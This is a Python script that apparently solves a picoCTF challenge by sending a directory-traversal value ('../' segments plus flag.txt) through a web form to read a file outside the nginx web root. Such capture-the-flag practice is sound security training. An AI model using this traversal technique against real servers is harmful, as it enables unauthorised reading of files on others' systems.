from urllib.parse import urljoin

import requests
import lxml.html
import re

nginx_root = '/usr/share/nginx/html/flag.txt'

resp = requests.get("http://saturn.picoctf.net:53638/")
doc = lxml.html.fromstring(resp.content)
form = doc.xpath("//form")[0]
url = urljoin(resp.url, form.attrib.get("action", ""))
method = form.attrib.get("method", "get")
param_name = form.xpath("//input")[0].attrib["name"]

resp = requests.request(
    method,
    url,
    **{
        ("params" if method == "get" else "data"): {
            param_name: "/".join([".."] * nginx_root.count("/")) + "/flag.txt"
        }
    }
)
flag = lxml.html.fromstring(resp.content).xpath("//body/text()")[0].strip()

print(flag)
